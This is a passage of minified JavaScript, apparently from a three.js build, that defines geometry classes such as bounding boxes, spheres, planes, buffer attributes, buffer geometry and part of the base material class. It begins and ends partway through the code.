d=m/(m-x),i.copy(s).addScaledVector(ks,d);Oh.subVectors(e,f);const E=ks.dot(Oh),T=Ws.dot(Oh);if(T>=0&&E<=T)return i.copy(f);const w=E*p-m*T;if(w<=0&&p>=0&&T<=0)return h=p/(p-T),i.copy(s).addScaledVector(Ws,h);const y=x*T-E*v;if(y<=0&&v-x>=0&&E-T>=0)return Fv.subVectors(f,c),h=(v-x)/(v-x+(E-T)),i.copy(c).addScaledVector(Fv,h);const S=1/(y+w+_);return d=w*S,h=_*S,i.copy(s).addScaledVector(ks,d).addScaledVector(Ws,h)}equals(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}}class Ml{constructor(e=new it(1/0,1/0,1/0),i=new it(-1/0,-1/0,-1/0)){this.isBox3=!0,this.min=e,this.max=i}set(e,i){return this.min.copy(e),this.max.copy(i),this}setFromArray(e){this.makeEmpty();for(let i=0,s=e.length;i<s;i+=3)this.expandByPoint(Pi.fromArray(e,i));return this}setFromBufferAttribute(e){this.makeEmpty();for(let i=0,s=e.count;i<s;i++)this.expandByPoint(Pi.fromBufferAttribute(e,i));return this}setFromPoints(e){this.makeEmpty();for(let i=0,s=e.length;i<s;i++)this.expandByPoint(e[i]);return this}setFromCenterAndSize(e,i){const s=Pi.copy(i).multiplyScalar(.5);return this.min.copy(e).sub(s),this.max.copy(e).add(s),this}setFromObject(e,i=!1){return this.makeEmpty(),this.expandByObject(e,i)}clone(){return new this.constructor().copy(this)}copy(e){return this.min.copy(e.min),this.max.copy(e.max),this}makeEmpty(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}isEmpty(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}getCenter(e){return this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}getSize(e){return this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)}expandByPoint(e){return this.min.min(e),this.max.max(e),this}expandByVector(e){return this.min.sub(e),this.max.add(e),this}expandByScalar(e){return this.min.addScalar(-e),this.max.addScalar(e),this}expandByObject(e,i=!1){e.updateWorldMatrix(!1,!1);const s=e.geometry;if(s!==void 0){const f=s.getAttribute("position");if(i===!0&&f!==void 0&&e.isInstancedMesh!==!0)for(let d=0,h=f.count;d<h;d++)e.isMesh===!0?e.getVertexPosition(d,Pi):Pi.fromBufferAttribute(f,d),Pi.applyMatrix4(e.matrixWorld),this.expandByPoint(Pi);else e.boundingBox!==void 0?(e.boundingBox===null&&e.computeBoundingBox(),Jc.copy(e.boundingBox)):(s.boundingBox===null&&s.computeBoundingBox(),Jc.copy(s.boundingBox)),Jc.applyMatrix4(e.matrixWorld),this.union(Jc)}const c=e.children;for(let f=0,d=c.length;f<d;f++)this.expandByObject(c[f],i);return this}containsPoint(e){return e.x>=this.min.x&&e.x<=this.max.x&&e.y>=this.min.y&&e.y<=this.max.y&&e.z>=this.min.z&&e.z<=this.max.z}containsBox(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z}getParameter(e,i){return i.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))}intersectsBox(e){return e.max.x>=this.min.x&&e.min.x<=this.max.x&&e.max.y>=this.min.y&&e.min.y<=this.max.y&&e.max.z>=this.min.z&&e.min.z<=this.max.z}intersectsSphere(e){return this.clampPoint(e.center,Pi),Pi.distanceToSquared(e.center)<=e.radius*e.radius}intersectsPlane(e){let i,s;return e.normal.x>0?(i=e.normal.x*this.min.x,s=e.normal.x*this.max.x):(i=e.normal.x*this.max.x,s=e.normal.x*this.min.x),e.normal.y>0?(i+=e.normal.y*this.min.y,s+=e.normal.y*this.max.y):(i+=e.normal.y*this.max.y,s+=e.normal.y*this.min.y),e.normal.z>0?(i+=e.normal.z*this.min.z,s+=e.normal.z*this.max.z):(i+=e.normal.z*this.max.z,s+=e.normal.z*this.min.z),i<=-e.constant&&s>=-e.constant}intersectsTriangle(e){if(this.isEmpty())return!1;this.getCenter(ol),$c.subVectors(this.max,ol),qs.subVectors(e.a,ol),Ys.subVectors(e.b,ol),Zs.subVectors(e.c,ol),dr.subVectors(Ys,qs),hr.subVectors(Zs,Ys),Hr.subVectors(qs,Zs);let i=[0,-dr.z,dr.y,0,-hr.z,hr.y,0,-Hr.z,Hr.y,dr.z,0,-dr.x,hr.z,0,-hr.x,Hr.z,0,-Hr.x,-dr.y,dr.x,0,-hr.y,hr.x,0,-Hr.y,Hr.x,0];return!Bh(i,qs,Ys,Zs,$c)||(i=[1,0,0,0,1,0,0,0,1],!Bh(i,qs,Ys,Zs,$c))?!1:(tu.crossVectors(dr,hr),i=[tu.x,tu.y,tu.z],Bh(i,qs,Ys,Zs,$c))}clampPoint(e,i){return i.copy(e).clamp(this.min,this.max)}distanceToPoint(e){return this.clampPoint(e,Pi).distanceTo(e)}getBoundingSphere(e){return this.isEmpty()?e.makeEmpty():(this.getCenter(e.center),e.radius=this.getSize(Pi).length()*.5),e}intersect(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this}union(e){return this.min.min(e.min),this.max.max(e.max),this}applyMatrix4(e){return this.isEmpty()?this:(Ra[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),Ra[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),Ra[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),Ra[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),Ra[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),Ra[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),Ra[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),Ra[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(Ra),this)}translate(e){return this.min.add(e),this.max.add(e),this}equals(e){return e.min.equals(this.min)&&e.max.equals(this.max)}toJSON(){return{min:this.min.toArray(),max:this.max.toArray()}}fromJSON(e){return this.min.fromArray(e.min),this.max.fromArray(e.max),this}}const Ra=[new it,new it,new it,new it,new it,new it,new it,new it],Pi=new it,Jc=new Ml,qs=new it,Ys=new it,Zs=new it,dr=new it,hr=new it,Hr=new it,ol=new it,$c=new it,tu=new it,Gr=new it;function Bh(o,e,i,s,c){for(let f=0,d=o.length-3;f<=d;f+=3){Gr.fromArray(o,f);const h=c.x*Math.abs(Gr.x)+c.y*Math.abs(Gr.y)+c.z*Math.abs(Gr.z),m=e.dot(Gr),p=i.dot(Gr),x=s.dot(Gr);if(Math.max(-Math.max(m,p,x),Math.min(m,p,x))>h)return!1}return!0}const gn=new it,eu=new Ue;let pb=0;class Fi extends Jr{constructor(e,i,s=!1){if(super(),Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.isBufferAttribute=!0,Object.defineProperty(this,"id",{value:pb++}),this.name="",this.array=e,this.itemSize=i,this.count=e!==void 0?e.length/i:0,this.normalized=s,this.usage=ZE,this.updateRanges=[],this.gpuType=ia,this.version=0}onUploadCallback(){}set needsUpdate(e){e===!0&&this.version++}setUsage(e){return this.usage=e,this}addUpdateRange(e,i){this.updateRanges.push({start:e,count:i})}clearUpdateRanges(){this.updateRanges.length=0}copy(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this.gpuType=e.gpuType,this}copyAt(e,i,s){e*=this.itemSize,s*=i.itemSize;for(let c=0,f=this.itemSize;c<f;c++)this.array[e+c]=i.array[s+c];return this}copyArray(e){return this.array.set(e),this}applyMatrix3(e){if(this.itemSize===2)for(let i=0,s=this.count;i<s;i++)eu.fromBufferAttribute(this,i),eu.applyMatrix3(e),this.setXY(i,eu.x,eu.y);else if(this.itemSize===3)for(let i=0,s=this.count;i<s;i++)gn.fromBufferAttribute(this,i),gn.applyMatrix3(e),this.setXYZ(i,gn.x,gn.y,gn.z);return this}applyMatrix4(e){for(let i=0,s=this.count;i<s;i++)gn.fromBufferAttribute(this,i),gn.applyMatrix4(e),this.setXYZ(i,gn.x,gn.y,gn.z);return this}applyNormalMatrix(e){for(let i=0,s=this.count;i<s;i++)gn.fromBufferAttribute(this,i),gn.applyNormalMatrix(e),this.setXYZ(i,gn.x,gn.y,gn.z);return this}transformDirection(e){for(let i=0,s=this.count;i<s;i++)gn.fromBufferAttribute(this,i),gn.transformDirection(e),this.setXYZ(i,gn.x,gn.y,gn.z);return this}set(e,i=0){return this.array.set(e,i),this}getComponent(e,i){let s=this.array[e*this.itemSize+i];return this.normalized&&(s=rl(s,this.array)),s}setComponent(e,i,s){return this.normalized&&(s=Qn(s,this.array)),this.array[e*this.itemSize+i]=s,this}getX(e){let i=this.array[e*this.itemSize];return this.normalized&&(i=rl(i,this.array)),i}setX(e,i){return this.normalized&&(i=Qn(i,this.array)),this.array[e*this.itemSize]=i,this}getY(e){let i=this.array[e*this.itemSize+1];return this.normalized&&(i=rl(i,this.array)),i}setY(e,i){return this.normalized&&(i=Qn(i,this.array)),this.array[e*this.itemSize+1]=i,this}getZ(e){let i=this.array[e*this.itemSize+2];return this.normalized&&(i=rl(i,this.array)),i}setZ(e,i){return this.normalized&&(i=Qn(i,this.array)),this.array[e*this.itemSize+2]=i,this}getW(e){let i=this.array[e*this.itemSize+3];return this.normalized&&(i=rl(i,this.array)),i}setW(e,i){return this.normalized&&(i=Qn(i,this.array)),this.array[e*this.itemSize+3]=i,this}setXY(e,i,s){return e*=this.itemSize,this.normalized&&(i=Qn(i,this.array),s=Qn(s,this.array)),this.array[e+0]=i,this.array[e+1]=s,this}setXYZ(e,i,s,c){return e*=this.itemSize,this.normalized&&(i=Qn(i,this.array),s=Qn(s,this.array),c=Qn(c,this.array)),this.array[e+0]=i,this.array[e+1]=s,this.array[e+2]=c,this}setXYZW(e,i,s,c,f){return e*=this.itemSize,this.normalized&&(i=Qn(i,this.array),s=Qn(s,this.array),c=Qn(c,this.array),f=Qn(f,this.array)),this.array[e+0]=i,this.array[e+1]=s,this.array[e+2]=c,this.array[e+3]=f,this}onUpload(e){return this.onUploadCallback=e,this}clone(){return new this.constructor(this.array,this.itemSize).copy(this)}toJSON(){const e={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.from(this.array),normalized:this.normalized};return e.name=this.name,e.usage=this.usage,e.gpuType=this.gpuType,e}dispose(){this.dispatchEvent({type:"dispose"})}}class jx extends Fi{constructor(e,i,s){super(new Uint16Array(e),i,s)}}class Qx extends Fi{constructor(e,i,s){super(new Uint32Array(e),i,s)}}class Wn extends Fi{constructor(e,i,s){super(new Float32Array(e),i,s)}}const mb=new Ml,ll=new it,Fh=new it;class El{constructor(e=new it,i=-1){this.isSphere=!0,this.center=e,this.radius=i}set(e,i){return this.center.copy(e),this.radius=i,this}setFromPoints(e,i){const s=this.center;i!==void 0?s.copy(i):mb.setFromPoints(e).getCenter(s);let c=0;for(let f=0,d=e.length;f<d;f++)c=Math.max(c,s.distanceToSquared(e[f]));return this.radius=Math.sqrt(c),this}copy(e){return this.center.copy(e.center),this.radius=e.radius,this}isEmpty(){return this.radius<0}makeEmpty(){return this.center.set(0,0,0),this.radius=-1,this}containsPoint(e){return e.distanceToSquared(this.center)<=this.radius*this.radius}distanceToPoint(e){return e.distanceTo(this.center)-this.radius}intersectsSphere(e){const i=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=i*i}intersectsBox(e){return e.intersectsSphere(this)}intersectsPlane(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius}clampPoint(e,i){const s=this.center.distanceToSquared(e);return i.copy(e),s>this.radius*this.radius&&(i.sub(this.center).normalize(),i.multiplyScalar(this.radius).add(this.center)),i}getBoundingBox(e){return this.isEmpty()?(e.makeEmpty(),e):(e.set(this.center,this.center),e.expandByScalar(this.radius),e)}applyMatrix4(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this}translate(e){return this.center.add(e),this}expandByPoint(e){if(this.isEmpty())return this.center.copy(e),this.radius=0,this;ll.subVectors(e,this.center);const i=ll.lengthSq();if(i>this.radius*this.radius){const s=Math.sqrt(i),c=(s-this.radius)*.5;this.center.addScaledVector(ll,c/s),this.radius+=c}return this}union(e){return e.isEmpty()?this:this.isEmpty()?(this.copy(e),this):(this.center.equals(e.center)===!0?this.radius=Math.max(this.radius,e.radius):(Fh.subVectors(e.center,this.center).setLength(e.radius),this.expandByPoint(ll.copy(e.center).add(Fh)),this.expandByPoint(ll.copy(e.center).sub(Fh))),this)}equals(e){return e.center.equals(this.center)&&e.radius===this.radius}clone(){return new this.constructor().copy(this)}toJSON(){return{radius:this.radius,center:this.center.toArray()}}fromJSON(e){return this.radius=e.radius,this.center.fromArray(e.center),this}}let gb=0;const Ei=new cn,Hh=new kn,Ks=new it,fi=new Ml,cl=new Ml,Tn=new it;class $n extends Jr{constructor(){super(),this.isBufferGeometry=!0,Object.defineProperty(this,"id",{value:gb++}),this.uuid=yl(),this.name="",this.type="BufferGeometry",this.index=null,this.indirect=null,this.indirectOffset=0,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={},this._transformed=!1}getIndex(){return this.index}setIndex(e){return Array.isArray(e)?this.index=new(KE(e)?Qx:jx)(e,1):this.index=e,this}setIndirect(e,i=0){return this.indirect=e,this.indirectOffset=i,this}getIndirect(){return this.indirect}getAttribute(e){return this.attributes[e]}setAttribute(e,i){return this.attributes[e]=i,this}deleteAttribute(e){return delete this.attributes[e],this}hasAttribute(e){return this.attributes[e]!==void 0}addGroup(e,i,s=0){this.groups.push({start:e,count:i,materialIndex:s})}clearGroups(){this.groups=[]}setDrawRange(e,i){this.drawRange.start=e,this.drawRange.count=i}applyMatrix4(e){const i=this.attributes.position;i!==void 0&&(i.applyMatrix4(e),i.needsUpdate=!0);const s=this.attributes.normal;if(s!==void 0){const f=new de().getNormalMatrix(e);s.applyNormalMatrix(f),s.needsUpdate=!0}const c=this.attributes.tangent;return c!==void 0&&(c.transformDirection(e),c.needsUpdate=!0),this.boundingBox!==null&&this.computeBoundingBox(),this.boundingSphere!==null&&this.computeBoundingSphere(),this._transformed=!0,this}applyQuaternion(e){return Ei.makeRotationFromQuaternion(e),this.applyMatrix4(Ei),this}rotateX(e){return Ei.makeRotationX(e),this.applyMatrix4(Ei),this}rotateY(e){return Ei.makeRotationY(e),this.applyMatrix4(Ei),this}rotateZ(e){return Ei.makeRotationZ(e),this.applyMatrix4(Ei),this}translate(e,i,s){return Ei.makeTranslation(e,i,s),this.applyMatrix4(Ei),this}scale(e,i,s){return Ei.makeScale(e,i,s),this.applyMatrix4(Ei),this}lookAt(e){return Hh.lookAt(e),Hh.updateMatrix(),this.applyMatrix4(Hh.matrix),this}center(){return this.computeBoundingBox(),this.boundingBox.getCenter(Ks).negate(),this.translate(Ks.x,Ks.y,Ks.z),this}setFromPoints(e){const i=this.getAttribute("position");if(i===void 0){const s=[];for(let c=0,f=e.length;c<f;c++){const d=e[c];s.push(d.x,d.y,d.z||0)}this.setAttribute("position",new Wn(s,3))}else{const s=Math.min(e.length,i.count);for(let c=0;c<s;c++){const f=e[c];i.setXYZ(c,f.x,f.y,f.z||0)}e.length>i.count&&se("BufferGeometry: Buffer size too small for points data. Use .dispose() and create a new geometry."),i.needsUpdate=!0}return this}computeBoundingBox(){this.boundingBox===null&&(this.boundingBox=new Ml);const e=this.attributes.position,i=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){Ie("BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box.",this),this.boundingBox.set(new it(-1/0,-1/0,-1/0),new it(1/0,1/0,1/0));return}if(e!==void 0){if(this.boundingBox.setFromBufferAttribute(e),i)for(let s=0,c=i.length;s<c;s++){const f=i[s];fi.setFromBufferAttribute(f),this.morphTargetsRelative?(Tn.addVectors(this.boundingBox.min,fi.min),this.boundingBox.expandByPoint(Tn),Tn.addVectors(this.boundingBox.max,fi.max),this.boundingBox.expandByPoint(Tn)):(this.boundingBox.expandByPoint(fi.min),this.boundingBox.expandByPoint(fi.max))}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&Ie('BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to have NaN values.',this)}computeBoundingSphere(){this.boundingSphere===null&&(this.boundingSphere=new El);const e=this.attributes.position,i=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){Ie("BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere.",this),this.boundingSphere.set(new it,1/0);return}if(e){const s=this.boundingSphere.center;if(fi.setFromBufferAttribute(e),i)for(let f=0,d=i.length;f<d;f++){const h=i[f];cl.setFromBufferAttribute(h),this.morphTargetsRelative?(Tn.addVectors(fi.min,cl.min),fi.expandByPoint(Tn),Tn.addVectors(fi.max,cl.max),fi.expandByPoint(Tn)):(fi.expandByPoint(cl.min),fi.expandByPoint(cl.max))}fi.getCenter(s);let c=0;for(let f=0,d=e.count;f<d;f++)Tn.fromBufferAttribute(e,f),c=Math.max(c,s.distanceToSquared(Tn));if(i)for(let f=0,d=i.length;f<d;f++){const h=i[f],m=this.morphTargetsRelative;for(let p=0,x=h.count;p<x;p++)Tn.fromBufferAttribute(h,p),m&&(Ks.fromBufferAttribute(e,p),Tn.add(Ks)),c=Math.max(c,s.distanceToSquared(Tn))}this.boundingSphere.radius=Math.sqrt(c),isNaN(this.boundingSphere.radius)&&Ie('BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}}computeTangents(){const e=this.index,i=this.attributes;if(e===null||i.position===void 0||i.normal===void 0||i.uv===void 0){Ie("BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");return}const s=i.position,c=i.normal,f=i.uv;let d=this.getAttribute("tangent");(d===void 0||d.count!==s.count)&&(d=new Fi(new Float32Array(4*s.count),4),this.setAttribute("tangent",d));const h=[],m=[];for(let b=0;b<s.count;b++)h[b]=new it,m[b]=new it;const p=new it,x=new it,v=new it,_=new Ue,E=new Ue,T=new Ue,w=new it,y=new it;function S(b,L,F){p.fromBufferAttribute(s,b),x.fromBufferAttribute(s,L),v.fromBufferAttribute(s,F),_.fromBufferAttribute(f,b),E.fromBufferAttribute(f,L),T.fromBufferAttribute(f,F),x.sub(p),v.sub(p),E.sub(_),T.sub(_);const V=1/(E.x*T.y-T.x*E.y);isFinite(V)&&(w.copy(x).multiplyScalar(T.y).addScaledVector(v,-E.y).multiplyScalar(V),y.copy(v).multiplyScalar(E.x).addScaledVector(x,-T.x).multiplyScalar(V),h[b].add(w),h[L].add(w),h[F].add(w),m[b].add(y),m[L].add(y),m[F].add(y))}let N=this.groups;N.length===0&&(N=[{start:0,count:e.count}]);for(let b=0,L=N.length;b<L;++b){const F=N[b],V=F.start,$=F.count;for(let ft=V,j=V+$;ft<j;ft+=3)S(e.getX(ft+0),e.getX(ft+1),e.getX(ft+2))}const B=new it,C=new it,U=new it,D=new it;function P(b){U.fromBufferAttribute(c,b),D.copy(U);const L=h[b];B.copy(L),B.sub(U.multiplyScalar(U.dot(L))).normalize(),C.crossVectors(D,L);const V=C.dot(m[b])<0?-1:1;d.setXYZW(b,B.x,B.y,B.z,V)}for(let b=0,L=N.length;b<L;++b){const F=N[b],V=F.start,$=F.count;for(let ft=V,j=V+$;ft<j;ft+=3)P(e.getX(ft+0)),P(e.getX(ft+1)),P(e.getX(ft+2))}this._transformed=!0}computeVertexNormals(){const e=this.index,i=this.getAttribute("position");if(i!==void 0){let s=this.getAttribute("normal");if(s===void 0||s.count!==i.count)s=new Fi(new Float32Array(i.count*3),3),this.setAttribute("normal",s);else for(let _=0,E=s.count;_<E;_++)s.setXYZ(_,0,0,0);const c=new it,f=new it,d=new it,h=new it,m=new it,p=new it,x=new it,v=new it;if(e)for(let _=0,E=e.count;_<E;_+=3){const T=e.getX(_+0),w=e.getX(_+1),y=e.getX(_+2);c.fromBufferAttribute(i,T),f.fromBufferAttribute(i,w),d.fromBufferAttribute(i,y),x.subVectors(d,f),v.subVectors(c,f),x.cross(v),h.fromBufferAttribute(s,T),m.fromBufferAttribute(s,w),p.fromBufferAttribute(s,y),h.add(x),m.add(x),p.add(x),s.setXYZ(T,h.x,h.y,h.z),s.setXYZ(w,m.x,m.y,m.z),s.setXYZ(y,p.x,p.y,p.z)}else for(let _=0,E=i.count;_<E;_+=3)c.fromBufferAttribute(i,_+0),f.fromBufferAttribute(i,_+1),d.fromBufferAttribute(i,_+2),x.subVectors(d,f),v.subVectors(c,f),x.cross(v),s.setXYZ(_+0,x.x,x.y,x.z),s.setXYZ(_+1,x.x,x.y,x.z),s.setXYZ(_+2,x.x,x.y,x.z);this.normalizeNormals(),s.needsUpdate=!0}}normalizeNormals(){const e=this.attributes.normal;for(let i=0,s=e.count;i<s;i++)Tn.fromBufferAttribute(e,i),Tn.normalize(),e.setXYZ(i,Tn.x,Tn.y,Tn.z)}toNonIndexed(){function e(h,m){const p=h.array,x=h.itemSize,v=h.normalized,_=new p.constructor(m.length*x);let E=0,T=0;for(let w=0,y=m.length;w<y;w++){h.isInterleavedBufferAttribute?E=m[w]*h.data.stride+h.offset:E=m[w]*x;for(let S=0;S<x;S++)_[T++]=p[E++]}return new Fi(_,x,v)}if(this.index===null)return se("BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."),this;const i=new $n,s=this.index.array,c=this.attributes;for(const h in c){const m=c[h],p=e(m,s);i.setAttribute(h,p)}const f=this.morphAttributes;for(const h in f){const m=[],p=f[h];for(let x=0,v=p.length;x<v;x++){const _=p[x],E=e(_,s);m.push(E)}i.morphAttributes[h]=m}i.morphTargetsRelative=this.morphTargetsRelative;const d=this.groups;for(let h=0,m=d.length;h<m;h++){const p=d[h];i.addGroup(p.start,p.count,p.materialIndex)}return i}toJSON(){const e={metadata:{version:4.7,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.parameters!==void 0&&this._transformed===!0?"BufferGeometry":this.type,e.name=this.name,Object.keys(this.userData).length>0&&(e.userData=this.userData),this.parameters!==void 0&&this._transformed!==!0){const m=this.parameters;for(const p in m)m[p]!==void 0&&(e[p]=m[p]);return e}e.data={attributes:{}};const i=this.index;i!==null&&(e.data.index={type:i.array.constructor.name,array:Array.prototype.slice.call(i.array)});const s=this.attributes;for(const m in s){const p=s[m];e.data.attributes[m]=p.toJSON(e.data)}const c={};let f=!1;for(const m in this.morphAttributes){const p=this.morphAttributes[m],x=[];for(let v=0,_=p.length;v<_;v++){const E=p[v];x.push(E.toJSON(e.data))}x.length>0&&(c[m]=x,f=!0)}f&&(e.data.morphAttributes=c,e.data.morphTargetsRelative=this.morphTargetsRelative);const d=this.groups;d.length>0&&(e.data.groups=JSON.parse(JSON.stringify(d)));const h=this.boundingSphere;return h!==null&&(e.data.boundingSphere=h.toJSON()),e}clone(){return new this.constructor().copy(this)}copy(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;const i={};this.name=e.name;const s=e.index;s!==null&&this.setIndex(s.clone());const c=e.attributes;for(const p in c){const x=c[p];this.setAttribute(p,x.clone(i))}const f=e.morphAttributes;for(const p in f){const x=[],v=f[p];for(let _=0,E=v.length;_<E;_++)x.push(v[_].clone(i));this.morphAttributes[p]=x}this.morphTargetsRelative=e.morphTargetsRelative;const d=e.groups;for(let p=0,x=d.length;p<x;p++){const v=d[p];this.addGroup(v.start,v.count,v.materialIndex)}const h=e.boundingBox;h!==null&&(this.boundingBox=h.clone());const m=e.boundingSphere;return m!==null&&(this.boundingSphere=m.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this._transformed=e._transformed,this}dispose(){this.dispatchEvent({type:"dispose"})}}const Gh=new it,_b=new it,vb=new de;class mr{constructor(e=new it(1,0,0),i=0){this.isPlane=!0,this.normal=e,this.constant=i}set(e,i){return this.normal.copy(e),this.constant=i,this}setComponents(e,i,s,c){return this.normal.set(e,i,s),this.constant=c,this}setFromNormalAndCoplanarPoint(e,i){return this.normal.copy(e),this.constant=-i.dot(this.normal),this}setFromCoplanarPoints(e,i,s){const c=Gh.subVectors(s,i).cross(_b.subVectors(e,i)).normalize();return this.setFromNormalAndCoplanarPoint(c,e),this}copy(e){return this.normal.copy(e.normal),this.constant=e.constant,this}normalize(){const e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this}negate(){return this.constant*=-1,this.normal.negate(),this}distanceToPoint(e){return this.normal.dot(e)+this.constant}distanceToSphere(e){return this.distanceToPoint(e.center)-e.radius}projectPoint(e,i){return i.copy(e).addScaledVector(this.normal,-this.distanceToPoint(e))}intersectLine(e,i,s=!0){const c=e.delta(Gh),f=this.normal.dot(c);if(f===0)return this.distanceToPoint(e.start)===0?i.copy(e.start):null;const d=-(e.start.dot(this.normal)+this.constant)/f;return s===!0&&(d<0||d>1)?null:i.copy(e.start).addScaledVector(c,d)}intersectsLine(e){const i=this.distanceToPoint(e.start),s=this.distanceToPoint(e.end);return i<0&&s>0||s<0&&i>0}intersectsBox(e){return e.intersectsPlane(this)}intersectsSphere(e){return e.intersectsPlane(this)}coplanarPoint(e){return e.copy(this.normal).multiplyScalar(-this.constant)}applyMatrix4(e,i){const s=i||vb.getNormalMatrix(e),c=this.coplanarPoint(Gh).applyMatrix4(e),f=this.normal.applyMatrix3(s).normalize();return this.constant=-c.dot(f),this}translate(e){return this.constant-=e.dot(this.normal),this}equals(e){return e.normal.equals(this.normal)&&e.constant===this.constant}clone(){return new this.constructor().copy(this)}toJSON(){return{normal:this.normal.toArray(),constant:this.constant}}fromJSON(e){return this.normal.fromArray(e.normal),this.constant=e.constant,this}}let xb=0;class so extends Jr{constructor(){super(),this.isMaterial=!0,Object.defineProperty(this,"id",{value:xb++}),this.uuid=yl(),this.name="",this.type="Material",this.blending=gl,this.side=Zr,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.alphaHash=!1,this.blendSrc=Cx,this.blendDst=wx,this.blendEquation=$s,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.blendColor=new ze(0,0,0),this.blendAlpha=0,this.depthFunc=_l,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=GE,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=yh,this.stencilZFail=yh,this.stencilZPass=yh,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaToCoverage=!1,this.premultipliedAlpha=!1,this.forceSinglePass=!1,this.allowOverride=!0,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0,this._alphaTest=0}get alphaTest(){return this._alphaTest}set alphaTest(e){this._alphaTest>0!=e>0&&this.version++,this._alphaTest=e}onBeforeRender(){}onBeforeCompile(){}customProgramCacheKey(){return this.onBeforeCompile.toString()}setValues(e){if(e!==void 0)for(const i in e){const s=e[i];if(s===void 0){se(`Material: parameter '${i}' has value of undefined.`);continue}const c=this[i];if(c===void 0){se(`Material: '${i}' is not a property of THREE.${this.type}.`);continue}c&&c.isColor?c.set(s):c&&c.isVector2&&s&&s.isVector2||c&&c.isEuler&&s&&s.isEuler||c&&c.isVector3&&s&&s.isVector3?c.copy(s):this[i]=s}}toJSON(e){const i=e===void 0||typeof e=="string";i&&(e={textures:{},images:{}});const s={metadata:{version:4.7,type:"Material",generator:"Material.toJSON"}};s.uuid=this.uuid,s.type=this.type,s.blending=this.blending,s.side=this.side,s.shadowSide=this.shadowSide,s.vertexColors=this.vertexColors,s.opacity=this.opacity,s.transparent=this.transparent,s.blendSrc=this.blendSrc,s.blendDst=this.blendDst,s.blendEquation=this.blendEquation,s.blendSrcAlpha=this.blendSrcAlpha,s.blendDstAlpha=this.blendDstAlpha,s.blendEquationAlpha=this.blendEquationAlpha,s.blendColor=this.blendColor.getHex(),s.blendAlpha=this.blendAlpha,s.depthFunc=this.depthFunc,s.depthTest=this.depthTest,s.depthWrite=this.depthWrite,s.colorWrite=this.colorWrite,s.clipIntersection=this.clipIntersection,s.clipShadows=this.clipShadows,s.stencilWriteMask=this.stencilWriteMask,s.stencilFunc=this.stencilFunc,s.stencilRef=this.stencilRef,s.stencilFuncMask=this.stencilFuncMask,s.stencilFail=this.stencilFail,s.stencilZFail=this.stencilZFail,s.stencilZPass=this.stencilZPass,s.stencilWrite=this.stencilWrite,s.polygonOffset=this.polygonOffset,s.polygonOffsetFactor=this.polygonOffsetFactor,s.polygonOffsetUnits=this.polygonOffsetUnits,s.dithering=this.dithering,s.alphaTest=this.alphaTest,s.alphaHash=this.alphaHash,s.alphaToCoverage=this.alphaToCoverage,s.premultipliedAlpha=this.premultipliedAlpha,s.forceSinglePass=this.forceSinglePass,s.allowOverride=this.allowOverride,s.visible=this.visible,s.toneMapped=this.toneMapped,s.name=this.name,this.color&&this.color.isColor&&(s.color=this.color.getHex()),this.roughness!==void 0&&(s.roughness=this.roughness),this.metalness!==void 0&&(s.metalness=this.metalness),this.sheen!==void 0&&(s.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(s.sheenColor=this.sheenColor.getHex()),this.sheenRoughness!==void 